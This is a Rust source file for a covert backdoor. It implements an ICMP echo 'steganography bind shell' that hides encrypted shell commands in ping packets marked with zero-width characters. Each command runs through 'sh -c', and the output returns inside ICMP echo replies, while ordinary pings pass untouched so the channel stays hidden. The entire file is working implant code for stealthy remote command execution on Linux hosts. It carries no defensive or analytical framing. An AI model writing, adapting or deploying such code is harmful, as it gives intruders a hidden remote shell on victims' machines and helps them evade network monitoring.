//! ICMP echo reply steganography bind shell (Linux-only, requires root/CAP_NET_RAW).
//!
//! Listens for ICMP echo requests containing ZW frame markers.
//! Only ZW-marked packets are processed — normal pings pass through.
//! Responses are ICMP echo replies with ZW-encoded encrypted output.

use std::os::fd::AsRawFd;
use tracing::{debug, info};

const ICMP_HDR_LEN: usize = 8;
const MAX_ICMP: usize = 1500;
const ICMP_ECHO_REQUEST: u8 = 8;
const ICMP_ECHO_REPLY: u8 = 0;

/// Start ICMP ZW bind shell. Returns Ok only on Linux with CAP_NET_RAW.
pub async fn spawn_icmp_shell(session_key: [u8; 32]) -> std::io::Result<()> {
    let raw_sock = crate::icmp_raw_socket()?;
    let fd = raw_sock.as_raw_fd();
    info!("ICMP ZW bind shell active (raw socket fd={})", fd);

    loop {
        let mut buf = vec![0u8; MAX_ICMP];
        let key = session_key;

        let result = tokio::task::spawn_blocking(move || {
            unsafe {
                let n = libc::recvfrom(
                    fd,
                    buf.as_mut_ptr() as *mut libc::c_void,
                    buf.len(),
                    0,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                );
                if n < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                buf.truncate(n as usize);
                Ok((buf, fd, key))
            }
        })
        .await
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))??;

        let (packet, resp_fd, key) = result;
        if let Some((reply, src)) = process_icmp(&packet, &key) {
            unsafe {
                let addr = libc::sockaddr_in {
                    sin_family: libc::AF_INET as u16,
                    sin_port: 0,
                    sin_addr: libc::in_addr { s_addr: src },
                    sin_zero: [0u8; 8],
                };
                libc::sendto(
                    resp_fd,
                    reply.as_ptr() as *const libc::c_void,
                    reply.len(),
                    0,
                    &addr as *const libc::sockaddr_in as *const libc::sockaddr,
                    std::mem::size_of::<libc::sockaddr_in>() as u32,
                );
            }
        }
    }
}

fn process_icmp(packet: &[u8], session_key: &[u8; 32]) -> Option<(Vec<u8>, u32)> {
    if packet.len() < ICMP_HDR_LEN + 1 || packet[0] != ICMP_ECHO_REQUEST {
        return None;
    }

    // Extract source IP from IP header (packet includes IP header with header_included)
    let src = if packet.len() >= 16 {
        u32::from_be_bytes([packet[12], packet[13], packet[14], packet[15]])
    } else {
        return None;
    };

    let payload = &packet[ICMP_HDR_LEN..];
    let data = String::from_utf8_lossy(payload).to_string();

    if !data.contains("\u{200B}\u{200B}") {
        return None; // Normal ping
    }

    debug!("ICMP ZW packet: {} bytes", payload.len());
    let mut session = arcticfox_zwtransport::ZwSession::new(*session_key);

    let plaintext = session.open(&data).ok()?;
    let cmd = String::from_utf8_lossy(&plaintext).to_string();
    debug!("ICMP ZW cmd: {}", cmd);

    let output = std::process::Command::new("sh")
        .arg("-c")
        .arg(&cmd)
        .output()
        .map(|o| {
            format!(
                "{}{}",
                String::from_utf8_lossy(&o.stdout),
                String::from_utf8_lossy(&o.stderr)
            )
        })
        .unwrap_or_else(|e| format!("[error: {}]", e));

    let frame = session.seal(output.as_bytes()).ok()?;

    // Build echo reply
    let mut reply = Vec::with_capacity(ICMP_HDR_LEN + frame.len());
    reply.push(ICMP_ECHO_REPLY);
    reply.push(0);
    reply.extend_from_slice(&[0u8; 2]); // checksum placeholder
    reply.extend_from_slice(&packet[4..8]); // id + seq from request
    reply.extend_from_slice(frame.as_bytes());

    let cs = icmp_checksum(&reply);
    reply[2] = (cs >> 8) as u8;
    reply[3] = cs as u8;

    Some((reply, src))
}

fn icmp_checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    for chunk in data.chunks(2) {
        let word = if chunk.len() == 2 {
            (chunk[0] as u32) << 8 | chunk[1] as u32
        } else {
            (chunk[0] as u32) << 8
        };
        sum = sum.wrapping_add(word);
    }
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    !(sum as u16)
}
